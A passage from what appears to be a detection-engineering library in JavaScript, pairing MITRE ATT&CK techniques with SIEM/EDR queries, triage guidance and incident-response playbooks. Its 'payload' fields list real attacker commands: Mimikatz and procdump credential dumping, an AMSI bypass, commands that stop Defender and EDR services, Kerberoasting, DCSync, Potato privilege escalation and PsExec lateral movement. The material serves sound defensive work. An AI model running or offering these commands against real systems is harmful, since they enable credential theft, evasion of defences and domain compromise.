        splunk:`index=wineventlog EventCode=4672 | where NOT match(SubjectUserName,"(?i)(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|DWM-|UMFD-)") | where match(PrivilegeList,"(?i)(SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege|SeDebugPrivilege)") | stats count by Computer, SubjectUserName, PrivilegeList`,
        sentinel:`SecurityEvent | where EventID==4672 | where SubjectUserName !in~ ("SYSTEM","LOCAL SERVICE","NETWORK SERVICE") | where PrivilegeList has_any ("SeImpersonatePrivilege","SeDebugPrivilege","SeTcbPrivilege")`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE "EventID"=4672 AND NOT username IN ('SYSTEM','LOCAL SERVICE','NETWORK SERVICE') AND (UTF8(payload) ILIKE '%SeImpersonatePrivilege%' OR UTF8(payload) ILIKE '%SeDebugPrivilege%') LAST 24 HOURS`,
        elastic:`event.code:"4672" and not user.name:("SYSTEM" or "LOCAL SERVICE" or "NETWORK SERVICE") and winlog.event_data.PrivilegeList:(*SeImpersonatePrivilege* or *SeDebugPrivilege*)`,
        wazuh:`<rule id="100501" level="14"><if_sid>18170</if_sid><field name="win.eventdata.privilegeList">SeImpersonatePrivilege|SeDebugPrivilege</field><description>Token impersonation privilege escalation</description><mitre><id>T1134.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where IntegrityLevel="System" AND ParentBaseFileName NOT IN ("services.exe","svchost.exe","lsass.exe")`,
        cortex_xdr:`dataset=xdr_data | filter event_type=PROCESS AND action_process_integrity_level="SYSTEM" AND causality_actor_process_image_name NOT IN ("services.exe","svchost.exe")`,
        sentinelone:`IntegrityLevel="SYSTEM" AND NOT ParentProcName IN ("services.exe","svchost.exe","lsass.exe")`
    },
    tpAnalysis:{
        truePositive:['Non-service account with SeImpersonatePrivilege executing commands as SYSTEM','Known Potato exploit binary detected (PrintSpoofer, JuicyPotato, GodPotato)','Debug privilege used by non-developer account','Token theft via Mimikatz token::elevate','Process integrity level jumps from Medium to SYSTEM unexpectedly'],
        falsePositive:['IIS application pool identities using impersonation','SQL Server service accounts','Backup software using elevated tokens','Authorized red team testing'],
        tpIndicators:'Service account escalating to SYSTEM, known exploit tool hashes, unexpected SeDebugPrivilege usage, privilege escalation from web service context',
        fpIndicators:'Known service account pattern, IT admin debugging session, authorized pentest, scheduled backup operation',
        investigationSteps:'1. Identify the process using elevated privileges\n2. Check for known exploit tool binaries\n3. Verify if the account should have these privileges\n4. Look for lateral movement after escalation\n5. Check for new accounts or group membership changes'
    },
    soarAutomation:{
        autoActions:['Identify the escalating process and hash it','Check hash against known exploit tools','Query account privileges baseline','Alert the identity/PAM team'],
        conditionalActions:['IF known exploit tool hash → Isolate immediately + Critical IR alert','IF web service account escalated → Possible web exploit chain, isolate server','IF debug privilege on non-dev account → Investigate credential compromise'],
        playbookFlow:'1. Detect privilege escalation → 2. Identify method (Potato/Mimikatz/other) → 3. Isolate → 4. Check lateral movement → 5. Reset credentials → 6. Patch vulnerability'
    },
    playbook:{
        detection:'Event 4672 logs special privilege assignment. Focus on non-service accounts receiving impersonation/debug privileges.',
        containment:'1. Isolate the affected system immediately\n2. Kill the escalation process\n3. Disable the compromised account\n4. Capture memory dump for forensics',
        eradication:'1. Identify initial access method\n2. Remove escalation tools\n3. Check for new accounts/group changes\n4. Verify no Golden/Silver tickets created',
        recovery:'1. Re-image compromised system\n2. Reset KRBTGT if domain admin exposure\n3. Enable Credential Guard\n4. Implement LSA RunAsPPL\n5. Deploy PAWs'
    },
    policy:'Privilege Management: Apply least privilege. Remove SeImpersonatePrivilege from unnecessary accounts. Enable Credential Guard. Implement LAPS. Restrict debug privileges.',
    payload:`# PrintSpoofer: PrintSpoofer.exe -i -c "cmd /c whoami"
# JuicyPotato: JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
# GodPotato: GodPotato.exe -cmd "net user hacker P@ss /add"
# Mimikatz token: privilege::debug / token::elevate / token::list`,
    useCases:['Detect Potato exploit usage','Monitor debug privilege assignment','Alert on unexpected SYSTEM escalation','Identify Mimikatz token manipulation','Detect web service to SYSTEM escalation'],
    references:['MITRE ATT&CK T1134','itm4n PrintSpoofer','Microsoft Token Security']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// DEFENSE EVASION (TA0005)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'DE-001',name:'Security Tool Tampering / EDR Evasion',category:'Defense Evasion',
    mitre:{tactic:'TA0005',technique:'T1562.001',name:'Disable or Modify Tools'},
    severity:'Critical',framework:'Enterprise',
    dataSources:['Windows Security Logs','Sysmon','EDR Health Telemetry'],
    description:'Detects attempts to disable, stop, or tamper with security tools (Defender, EDR, AMSI, ETW, Sysmon).',
    queries:{
        splunk:`(index=wineventlog OR index=sysmon) | eval tampering=case(match(_raw,"(?i)(sc\\s+stop|net\\s+stop).*(WinDefend|MsSense|CrowdStrike|SentinelAgent|CbDefense|Sysmon)"),"Service Stop",match(_raw,"(?i)(Set-MpPreference.*-DisableRealtimeMonitoring)"),"Defender Disabled",match(_raw,"(?i)(fltMC.*unload)"),"Driver Unload",match(_raw,"(?i)(taskkill.*(MsMpEng|SenseIR|CSFalcon))"),"Process Kill",1=1,null()) | where isnotnull(tampering) | stats count by Computer, User, tampering`,
        sentinel:`DeviceProcessEvents | where ProcessCommandLine matches regex @"(?i)((sc|net)\\s+stop.*(WinDefend|MsSense|Sysmon))|(Set-MpPreference.*Disable)|(taskkill.*(MsMpEng|SenseIR))|(fltMC.*unload)"`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE (UTF8(payload) ILIKE '%sc stop%WinDefend%' OR UTF8(payload) ILIKE '%DisableRealtimeMonitoring%' OR UTF8(payload) ILIKE '%taskkill%MsMpEng%') LAST 1 HOURS`,
        elastic:`process.command_line:((*"sc stop"* or *"net stop"*) and (*WinDefend* or *MsSense* or *Sysmon*)) or process.command_line:*DisableRealtimeMonitoring*`,
        wazuh:`<rule id="100601" level="15"><if_sid>61603</if_sid><field name="win.eventdata.commandLine">sc stop|net stop|DisableRealtimeMonitoring|fltMC.*unload</field><description>CRITICAL: Security tool tampering</description><mitre><id>T1562.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where CommandLine MATCHES ".*(sc stop|net stop).*(WinDefend|MsSense|CrowdStrike).*" OR CommandLine MATCHES ".*DisableRealtimeMonitoring.*"`,
        cortex_xdr:`dataset=xdr_data | filter action_process_command_line~="(sc|net) stop.*(WinDefend|MsSense|Sysmon)" OR action_process_command_line~="DisableRealtimeMonitoring"`,
        sentinelone:`CmdLine MATCHES ".*(sc stop|net stop).*(WinDefend|MsSense|Sysmon).*" OR CmdLine CONTAINS "DisableRealtimeMonitoring"`
    },
    tpAnalysis:{
        truePositive:['Security service stopped without change ticket','Tampering followed by malware deployment','AMSI bypass followed by offensive tool execution','Sysmon driver unloaded by non-admin process','Multiple security tools disabled in sequence'],
        falsePositive:['Authorized EDR maintenance/upgrade','IT patching workflow restarting services','Defender exclusion management by authorized admin'],
        tpIndicators:'No change ticket, multiple tools disabled, followed by malware activity, non-standard process performing the action',
        fpIndicators:'Change ticket exists, authorized admin account, during maintenance window, single service restart',
        investigationSteps:'1. Check change management for authorized maintenance\n2. Verify the account performing the action\n3. Check what happened AFTER tools were disabled\n4. Verify all security tools are now functional\n5. Look for malware deployment during blind spot'
    },
    soarAutomation:{
        autoActions:['IMMEDIATELY re-enable the disabled security tool','Alert SOC with Critical severity','Check change management system for approval','Deploy backup monitoring agent'],
        conditionalActions:['IF no change ticket → Critical IR activation + isolate endpoint','IF malware deployed during blind spot → Full incident response','IF multiple tools disabled → Assume active breach in progress'],
        playbookFlow:'1. Detect tampering → 2. Auto re-enable tools → 3. Check authorization → 4. If unauthorized: isolate + investigate → 5. Full forensics'
    },
    playbook:{
        detection:'Critical alert - any security service tampering must be investigated immediately. Check change management.',
        containment:'1. IMMEDIATELY re-enable disabled tools\n2. Isolate endpoint\n3. Deploy backup monitoring\n4. Disable the account\n5. Escalate to Incident Commander',
        eradication:'1. Determine what was executed during blind spot\n2. Full forensic analysis\n3. Check for malware deployment\n4. Verify all tools are functional\n5. Hunt for tampering on other endpoints',
        recovery:'1. Re-image endpoint\n2. Verify all security agents healthy\n3. Enable tamper protection\n4. Implement PPL for security services\n5. Restrict service management access'
    },
    policy:'Security Tool Protection: Enable tamper protection on all EDR/AV. Restrict ability to stop security services. Implement PPL. Alert on any security service state change.',
    payload:`# Disabling Defender: Set-MpPreference -DisableRealtimeMonitoring $true
# Stopping EDR: sc stop CrowdStrike / net stop SentinelAgent
# Disabling Sysmon: fltMC.exe unload SysmonDrv
# Disabling ETW: logman stop "EventLog-Security" -ets
# AMSI bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
    useCases:['Detect EDR/AV tampering','Monitor Sysmon driver unloading','Alert on Defender being disabled','Identify ETW tampering','Detect AMSI bypass attempts'],
    references:['MITRE ATT&CK T1562.001','Microsoft Tamper Protection','Elastic Endpoint Security']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// CREDENTIAL ACCESS (TA0006)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'CA-001',name:'LSASS Memory Credential Dumping',category:'Credential Access',
    mitre:{tactic:'TA0006',technique:'T1003.001',name:'LSASS Memory'},
    severity:'Critical',framework:'Enterprise',
    dataSources:['Sysmon (Event 10)','Windows Security Logs','EDR Telemetry'],
    description:'Detects access to LSASS process memory to extract credentials, NTLM hashes, and Kerberos tickets. #1 credential theft technique.',
    queries:{
        splunk:`index=sysmon EventCode=10 TargetImage="*\\lsass.exe" | where NOT match(SourceImage,"(?i)(csrss|lsass|wininit|svchost|MsMpEng|MsSense|CrowdStrike)") | where match(GrantedAccess,"(0x1010|0x1410|0x1438|0x143a|0x1fffff)") | stats count by Computer, SourceImage, GrantedAccess, SourceUser`,
        sentinel:`DeviceProcessEvents | where FileName in~ ("procdump.exe","rundll32.exe","taskmgr.exe") | where ProcessCommandLine has_any ("lsass","MiniDump","sekurlsa","comsvcs") | union (DeviceEvents | where ActionType=="LsassAccess")`,
        qradar:`SELECT sourceip, username, UTF8(payload) FROM events WHERE LOGSOURCETYPENAME(logsourceid)='Sysmon' AND "EventID"=10 AND UTF8(payload) ILIKE '%lsass.exe%' AND UTF8(payload) NOT ILIKE '%csrss%' LAST 24 HOURS`,
        elastic:`event.code:"10" and winlog.event_data.TargetImage:*lsass.exe and not process.name:("csrss.exe" or "lsass.exe" or "svchost.exe" or "MsMpEng.exe")`,
        wazuh:`<rule id="100701" level="15"><if_sid>61645</if_sid><field name="win.eventdata.targetImage">lsass.exe</field><field name="win.eventdata.grantedAccess">0x1010|0x1410|0x1438|0x1fffff</field><description>CRITICAL: LSASS credential dumping</description><mitre><id>T1003.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=LsassHandleRequest | where NOT (ContextBaseFileName IN ("csrss.exe","svchost.exe","MsMpEng.exe"))`,
        cortex_xdr:`dataset=xdr_data | filter event_type=INJECTION AND action_target_process_name="lsass.exe"`,
        sentinelone:`TgtProcName="lsass.exe" AND EventType="Open Remote Process Handle" AND NOT SrcProcName IN ("csrss.exe","svchost.exe")`
    },
    tpAnalysis:{
        truePositive:['Known credential dumping tool accessing LSASS (Mimikatz, procdump)','comsvcs.dll MiniDump called on LSASS PID','High access rights (0x1FFFFF = PROCESS_ALL_ACCESS)','Dump file created in temp directory','Process access from unsigned/unknown binary'],
        falsePositive:['Windows Error Reporting (WerFault.exe)','Anti-malware solutions scanning LSASS','Certain backup software','Microsoft Defender ATP sensor'],
        tpIndicators:'Known tool hash, high access rights, dump file creation, unsigned source process, non-standard LSASS accessor',
        fpIndicators:'Source is known security tool, WerFault.exe crash handler, standard access rights, Microsoft-signed binary',
        investigationSteps:'1. Identify the tool used (check source process hash)\n2. Determine which credentials were at risk\n3. Check for dump file creation on disk\n4. Look for lateral movement from this host\n5. Check if Golden/Silver tickets were created'
    },
    soarAutomation:{
        autoActions:['IMMEDIATELY isolate the endpoint','Hash source process and check VT','List all accounts that logged into this system','Alert identity team for mass password reset','Capture forensic memory image'],
        conditionalActions:['IF Mimikatz confirmed → Full domain compromise response','IF domain admin credentials were cached → KRBTGT reset procedure','IF dump file found on disk → Quarantine + full disk forensics'],
        playbookFlow:'1. Detect LSASS access → 2. Auto-isolate → 3. Identify tool → 4. Mass credential reset → 5. Hunt for lateral movement → 6. Domain compromise assessment'
    },
    playbook:{
        detection:'Sysmon Event 10 captures cross-process LSASS access. Key: suspicious source process + high access rights.',
        containment:'1. IMMEDIATELY isolate endpoint\n2. Assume ALL cached credentials compromised\n3. Disable attacker account\n4. Begin emergency password reset\n5. Notify identity team',
        eradication:'1. Identify the dumping tool\n2. Force reset for ALL accounts that logged into compromised system\n3. Reset KRBTGT if domain admin exposed\n4. Check for Golden/Silver tickets',
        recovery:'1. Re-image compromised endpoint\n2. Reset KRBTGT twice if domain compromise\n3. Enable Credential Guard\n4. Enable LSA RunAsPPL\n5. Deploy PAWs'
    },
    policy:'Credential Protection: Enable Credential Guard. Configure LSASS as PPL. Block credential dumping tools via WDAC. Implement LAPS. Disable WDigest.',
    payload:`# Mimikatz: privilege::debug / sekurlsa::logonpasswords
# ProcDump: procdump.exe -ma lsass.exe lsass.dmp
# Comsvcs.dll (LOLBin): rundll32.exe comsvcs.dll,MiniDump <PID> dump.dmp full
# NanoDump: direct syscalls, EDR bypass
# Task Manager: Right-click lsass → Create dump file`,
    useCases:['Detect Mimikatz targeting LSASS','Monitor LOLBin LSASS dumps','Alert on suspicious process accessing LSASS','Identify credential theft in attack chains','Detect advanced dump evasion techniques'],
    references:['MITRE ATT&CK T1003.001','Microsoft Credential Guard','Mimikatz Documentation']
},
{
    id:'CA-002',name:'Kerberoasting Attack',category:'Credential Access',
    mitre:{tactic:'TA0006',technique:'T1558.003',name:'Kerberoasting'},
    severity:'High',framework:'Enterprise',
    dataSources:['Windows Security Logs (4769)','Domain Controller Logs'],
    description:'Detects Kerberoasting where an attacker requests TGS tickets with RC4 encryption for service accounts to crack offline.',
    queries:{
        splunk:`index=wineventlog EventCode=4769 TicketEncryptionType=0x17 | where ServiceName!="krbtgt" | where NOT match(ServiceName,"\\$$") | bucket _time span=5m | stats count as TGSRequests, dc(ServiceName) as UniqueServices, values(ServiceName) as TargetServices by IpAddress, TargetUserName, _time | where TGSRequests>=5 OR UniqueServices>=3`,
        sentinel:`SecurityEvent | where EventID==4769 | where TicketEncryptionType=="0x17" | where ServiceName !endswith "$" | where ServiceName !="krbtgt" | summarize TGSRequests=count(), UniqueServices=dcount(ServiceName), Services=make_set(ServiceName) by IpAddress, TargetUserName, bin(TimeGenerated,5m) | where TGSRequests>=5 or UniqueServices>=3`,
        qradar:`SELECT sourceip, username, COUNT(*) as TGSRequests, COUNT(DISTINCT UTF8(payload)) as UniqueServices FROM events WHERE "EventID"=4769 AND UTF8(payload) ILIKE '%0x17%' AND UTF8(payload) NOT ILIKE '%krbtgt%' GROUP BY sourceip, username HAVING TGSRequests>=5 LAST 1 HOURS`,
        elastic:`event.code:"4769" and winlog.event_data.TicketEncryptionType:"0x17" and not winlog.event_data.ServiceName:"krbtgt"`,
        wazuh:`<rule id="100710" level="12" frequency="5" timeframe="300"><if_sid>18240</if_sid><field name="win.eventdata.ticketEncryptionType">0x17</field><description>Kerberoasting: Multiple RC4 TGS requests</description><mitre><id>T1558.003</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=KerberosServiceTicketRequest | where EncryptionType="RC4" AND NOT ServiceName MATCHES ".*\\$"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=KERBEROS AND action_kerberos_encryption_type="RC4"`,
        sentinelone:`EventType="Kerberos" AND EncryptionType="RC4" AND NOT ServiceName MATCHES ".*\\$"`
    },
    tpAnalysis:{
        truePositive:['Multiple RC4 TGS requests for different SPNs in short timeframe','Requests from non-service workstation','Followed by offline cracking attempts (not visible in logs but inferred by timing)','Target SPNs are high-privilege service accounts (SQL, Exchange)','No prior history of Kerberos service ticket requests from this user'],
        falsePositive:['Legacy applications requiring RC4 encryption','Normal service authentication patterns','Domain join operations','Certain monitoring tools querying services'],
        tpIndicators:'Multiple SPNs requested rapidly (5+ in 5min), RC4 encryption type, non-machine account requesting, targeting high-value SPNs, unusual requesting account',
        fpIndicators:'Single SPN request, known legacy application, machine account requesting, normal service operation',
        investigationSteps:'1. Identify all targeted service accounts\n2. Check if service account passwords are weak\n3. Verify the requesting account is legitimate\n4. Check if any service accounts were subsequently used\n5. Determine if RC4 is required by legacy apps'
    },
    soarAutomation:{
        autoActions:['List all targeted service account SPNs','Check service account password age','Alert identity team for emergency password rotation','Query if any targeted accounts were used post-attack'],
        conditionalActions:['IF >10 SPNs targeted → Critical: mass Kerberoast campaign','IF service account used after attack → Assume cracked, immediate reset','IF targeting domain admin SPN → Emergency domain compromise procedure'],
        playbookFlow:'1. Detect RC4 TGS burst → 2. Identify targets → 3. Emergency password rotation → 4. Check for compromise → 5. Migrate to gMSA → 6. Disable RC4'
    },
    playbook:{
        detection:'Event 4769 with RC4 encryption (0x17) for service ticket requests. Multiple SPNs in short timeframe is strong indicator.',
        containment:'1. Identify and disable requesting account\n2. Begin emergency password rotation for targeted service accounts\n3. Monitor targeted accounts for unauthorized use',
        eradication:'1. Reset ALL targeted service account passwords to 25+ chars\n2. Migrate to gMSA\n3. Enable AES-only encryption\n4. Identify initial access vector',
        recovery:'1. Implement gMSA for all services\n2. Disable RC4 via GPO\n3. Set service account passwords 25+ chars\n4. Deploy honeypot SPNs\n5. Rotate passwords every 90 days'
    },
    policy:'Kerberos Security: Disable RC4 encryption via GPO. Use gMSA for all services. Enforce 25+ char service account passwords. Deploy honey token SPNs.',
    payload:`# Rubeus: Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
# PowerShell: Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt
# Impacket: GetUserSPNs.py domain/user:password -dc-ip DC_IP -outputfile hashes.txt
# Crack: hashcat -m 13100 hashes.txt rockyou.txt`,
    useCases:['Detect Kerberoasting via RC4 TGS requests','Monitor mass service ticket requests','Alert on targeting high-value SPNs','Detect targeted Kerberoast of domain admin','Detect Kerberoast-based lateral movement'],
    references:['MITRE ATT&CK T1558.003','Sean Metcalf AD Security','Microsoft Kerberos Security']
},
{
    id:'CA-003',name:'DCSync Attack',category:'Credential Access',
    mitre:{tactic:'TA0006',technique:'T1003.006',name:'DCSync'},
    severity:'Critical',framework:'Enterprise',
    dataSources:['Windows Security Logs (4662)','Domain Controller Logs'],
    description:'Detects DCSync attacks where an attacker with replication rights mimics a domain controller to replicate password hashes from Active Directory.',
    queries:{
        splunk:`index=wineventlog EventCode=4662 | where match(Properties,"(?i)(1131f6aa|1131f6ad|89e95b76)") | where NOT match(SubjectUserName,"(?i)(\\$|MSOL_|AAD)") | stats count by Computer, SubjectUserName, SubjectLogonId, ObjectName`,
        sentinel:`SecurityEvent | where EventID==4662 | where Properties has_any ("1131f6aa","1131f6ad","89e95b76") | where SubjectUserName !endswith "$" | where SubjectUserName !startswith "MSOL_"`,
        qradar:`SELECT sourceip, username FROM events WHERE "EventID"=4662 AND (UTF8(payload) ILIKE '%1131f6aa%' OR UTF8(payload) ILIKE '%1131f6ad%') AND NOT username ILIKE '%$' LAST 24 HOURS`,
        elastic:`event.code:"4662" and winlog.event_data.Properties:(*1131f6aa* or *1131f6ad* or *89e95b76*) and not user.name:*$`,
        wazuh:`<rule id="100720" level="15"><if_sid>18280</if_sid><field name="win.eventdata.properties">1131f6aa|1131f6ad|89e95b76</field><description>CRITICAL: DCSync attack detected</description><mitre><id>T1003.006</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=DCSync | stats count by UserName, RemoteAddressIP4`,
        cortex_xdr:`dataset=xdr_data | filter event_type=DIRECTORY_SERVICE AND action_directory_service_access_type="Replication"`,
        sentinelone:`EventType="DirectoryServiceReplication" AND NOT SrcUser MATCHES ".*\\$"`
    },
    tpAnalysis:{
        truePositive:['Non-DC machine account performing replication','Non-MSOL/AAD sync account using replication rights','Replication request from workstation IP','Account not in Domain Admins or similar privileged group','Followed by use of extracted credentials'],
        falsePositive:['Azure AD Connect (MSOL_ accounts)','Additional domain controllers replicating','Microsoft Identity Manager','Authorized AD security assessment'],
        tpIndicators:'Non-DC source, non-sync account, replication GUID access rights, workstation IP performing replication, account without legitimate replication need',
        fpIndicators:'Known DC IP, MSOL_ or AAD sync account, domain controller machine account, authorized assessment',
        investigationSteps:'1. Verify source is not a legitimate DC\n2. Check account for replication rights (should it have them?)\n3. Determine how the account obtained these rights\n4. Check if KRBTGT hash was replicated\n5. Assess scope of credential exposure'
    },
    soarAutomation:{
        autoActions:['Verify source IP against DC inventory','Check account group membership','Alert domain admin team immediately','Check if KRBTGT was in replication scope'],
        conditionalActions:['IF confirmed DCSync from non-DC → IMMEDIATE: disable account + KRBTGT reset','IF KRBTGT replicated → Double KRBTGT reset + full domain compromise response','IF from known DC → Verify DC health, possible rogue DC'],
        playbookFlow:'1. Detect replication from non-DC → 2. Verify source → 3. Disable account → 4. KRBTGT reset x2 → 5. Full AD compromise assessment → 6. Domain rebuild if necessary'
    },
    playbook:{
        detection:'Event 4662 with replication GUIDs from non-DC accounts. This is one of the most critical AD attacks.',
        containment:'1. IMMEDIATELY disable the attacking account\n2. Revoke all replication rights from non-DC accounts\n3. Begin KRBTGT password reset\n4. Isolate the attacking system\n5. Activate full IR',
        eradication:'1. Reset KRBTGT password TWICE (12h apart)\n2. Reset all compromised credential hashes\n3. Remove unnecessary replication rights\n4. Identify how attacker gained replication permissions',
        recovery:'1. Complete KRBTGT double-reset\n2. Force domain-wide password reset\n3. Rebuild trust relationships\n4. Implement AD tiering model\n5. Deploy Defender for Identity'
    },
    policy:'AD Security: Monitor Event 4662 for replication GUIDs. Only DCs should have replication rights. Deploy Defender for Identity. Implement AD tiering.',
    payload:`# DCSync via Mimikatz:
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# DCSync via Impacket:
secretsdump.py domain/admin:password@DC_IP`,
    useCases:['Detect DCSync attacks','Monitor unauthorized AD replication','Alert on KRBTGT hash extraction','Detect domain compromise via replication','Monitor for rogue DC activity'],
    references:['MITRE ATT&CK T1003.006','Microsoft AD Replication Security','Sean Metcalf DCSync Detection']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// LATERAL MOVEMENT (TA0008)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'LM-001',name:'Lateral Movement via PsExec / SMB',category:'Lateral Movement',
    mitre:{tactic:'TA0008',technique:'T1021.002',name:'SMB/Windows Admin Shares'},
    severity:'High',framework:'Enterprise',
    dataSources:['Sysmon (Event 1, 17/18)','Windows Security Logs','Network Logs'],
    description:'Detects lateral movement via PsExec, Impacket, or SMB admin shares (C$, ADMIN$).',
    queries:{
        splunk:`index=sysmon EventCode=1 | where match(Image,"(?i)(psexec|psexesvc|paexec)") OR (match(ParentImage,"(?i)services\\.exe") AND match(Image,"(?i)(cmd|powershell)") AND match(User,"(?i)SYSTEM")) | stats count by Computer, User, Image, CommandLine`,
        sentinel:`SecurityEvent | where EventID==4624 and LogonType==3 | where AuthenticationPackageName=="NTLM" | join kind=inner (DeviceProcessEvents | where InitiatingProcessFileName=~"services.exe" | where FileName in~ ("cmd.exe","powershell.exe") | where AccountName=~"SYSTEM") on $left.Computer==$right.DeviceName`,
        qradar:`SELECT sourceip, destinationip, username FROM events WHERE ("EventID"=4624 AND UTF8(payload) ILIKE '%LogonType%3%') OR UTF8(payload) ILIKE '%PSEXESVC%' OR (UTF8(payload) ILIKE '%ADMIN$%' AND "EventID"=5145) LAST 1 HOURS`,
        elastic:`process.name:("PSEXESVC.exe" or "psexec.exe" or "paexec.exe") or (process.parent.name:"services.exe" and process.name:("cmd.exe" or "powershell.exe") and user.name:"SYSTEM")`,
        wazuh:`<rule id="100801" level="12"><if_sid>61603</if_sid><field name="win.eventdata.image">PSEXESVC|psexec|paexec</field><description>PsExec lateral movement detected</description><mitre><id>T1021.002</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where FileName="PSEXESVC.exe" OR (ParentBaseFileName="services.exe" AND FileName IN ("cmd.exe","powershell.exe") AND UserName="SYSTEM")`,
        cortex_xdr:`dataset=xdr_data | filter action_process_image_name="PSEXESVC.exe" OR (causality_actor_process_image_name="services.exe" AND action_process_image_name IN ("cmd.exe","powershell.exe"))`,
        sentinelone:`SrcProcName="PSEXESVC.exe" OR (ParentProcName="services.exe" AND SrcProcName IN ("cmd.exe","powershell.exe") AND User="SYSTEM")`
    },
    tpAnalysis:{
        truePositive:['PsExec/Impacket connecting from compromised workstation','ADMIN$ share access from non-admin workstation','Service creation (PSEXESVC) followed by command execution','SMB lateral movement during off-hours','Multiple hosts targeted in rapid succession'],
        falsePositive:['IT admin using PsExec for legitimate remote management','SCCM remote execution','Authorized remote deployment tools','Backup software accessing admin shares'],
        tpIndicators:'Non-IT source machine, off-hours activity, multiple targets, PSEXESVC service creation, preceded by credential theft indicators',
        fpIndicators:'Source is admin workstation, during business hours, single target, matches known admin pattern, change ticket exists',
        investigationSteps:'1. Identify source and destination systems\n2. Verify the account used for lateral movement\n3. Check if source system is compromised\n4. Map all systems accessed in the attack chain\n5. Look for persistence on each accessed system'
    },
    soarAutomation:{
        autoActions:['Identify source and destination hosts','Check if source is authorized admin workstation','Verify the account used has admin privileges legitimately','Check for preceding credential theft on source'],
        conditionalActions:['IF source is non-admin workstation → Block SMB from source + isolate both endpoints','IF multiple targets → Full lateral movement investigation','IF during off-hours with no change ticket → Critical IR activation'],
        playbookFlow:'1. Detect PsExec/SMB lateral movement → 2. Verify authorization → 3. If unauthorized: isolate all touched systems → 4. Map attack chain → 5. Credential reset → 6. Network segmentation review'
    },
    playbook:{
        detection:'PsExec creates PSEXESVC service and named pipe on target. SMB traffic to ADMIN$ share is a key indicator.',
        containment:'1. Block SMB from source system\n2. Disable PSEXESVC on target\n3. Isolate both source and target\n4. Disable the account used\n5. Kill all sessions from attacking IP',
        eradication:'1. Identify all accessed systems\n2. Check each for persistence\n3. Remove PSEXESVC artifacts\n4. Reset credentials used\n5. Map full attack chain',
        recovery:'1. Re-image confirmed compromised systems\n2. Disable admin shares on workstations\n3. Implement SMB signing\n4. Deploy network segmentation\n5. Implement LAPS'
    },
    policy:'Lateral Movement Prevention: Disable admin shares on workstations. Implement SMB signing. Restrict SMB between workstations. Use LAPS. Implement PAWs.',
    payload:`# PsExec: PsExec.exe \\\\TARGET -u DOMAIN\\admin -p password cmd.exe
# Impacket: psexec.py domain/admin:password@TARGET
# Admin shares: net use \\\\TARGET\\C$ /user:DOMAIN\\admin password
# WMIC: wmic /node:TARGET process call create "cmd /c payload.exe"`,
    useCases:['Detect PsExec remote execution','Monitor admin share access','Alert on service creation by remote users','Identify SMB lateral movement chains','Detect Impacket-based execution'],
    references:['MITRE ATT&CK T1021.002','Detecting Lateral Movement - SANS','Microsoft PsExec']
},
{
    id:'LM-002',name:'RDP Lateral Movement',category:'Lateral Movement',
    mitre:{tactic:'TA0008',technique:'T1021.001',name:'Remote Desktop Protocol'},
    severity:'Medium',framework:'Enterprise',
    dataSources:['Windows Security Logs (4624)','RDP Logs (Event 1149)','Network Logs'],
    description:'Detects suspicious RDP lateral movement patterns including RDP from unusual sources, RDP to sensitive servers, and RDP chain hopping.',
    queries:{
        splunk:`index=wineventlog EventCode=4624 LogonType=10 | where NOT match(IpAddress,"(?i)(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)") OR match(TargetServerName,"(?i)(dc|sql|exchange|admin|backup)") | stats count as RDPSessions, dc(TargetServerName) as UniqueTargets, values(TargetServerName) as Targets by IpAddress, TargetUserName | where RDPSessions >= 3 OR UniqueTargets >= 2`,
        sentinel:`SecurityEvent | where EventID==4624 and LogonType==10 | summarize RDPSessions=count(), UniqueTargets=dcount(Computer) by IpAddress, TargetUserName, bin(TimeGenerated,1h) | where RDPSessions>=3 or UniqueTargets>=2`,
        qradar:`SELECT sourceip, destinationip, username, COUNT(*) as Sessions FROM events WHERE "EventID"=4624 AND "LogonType"=10 GROUP BY sourceip, destinationip, username HAVING Sessions>=3 LAST 1 HOURS`,
        elastic:`event.code:"4624" and winlog.event_data.LogonType:"10" | Threshold: count >= 3 per source.ip in 1h`,
        wazuh:`<rule id="100810" level="10" frequency="3" timeframe="3600"><if_sid>18100</if_sid><field name="win.eventdata.logonType">10</field><description>Multiple RDP sessions from same source</description><mitre><id>T1021.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=UserLogon | where LogonType=10 | stats dc(ComputerName) as Targets by RemoteAddressIP4 | where Targets >= 2`,
        cortex_xdr:`dataset=xdr_data | filter event_type=LOGIN AND action_login_type=RDP | comp count_distinct(agent_hostname) as Targets by action_remote_ip | filter Targets >= 2`,
        sentinelone:`EventType="Login" AND LoginType="RDP" | Group by SrcIP having count(distinct Endpoint) >= 2`
    },
    tpAnalysis:{
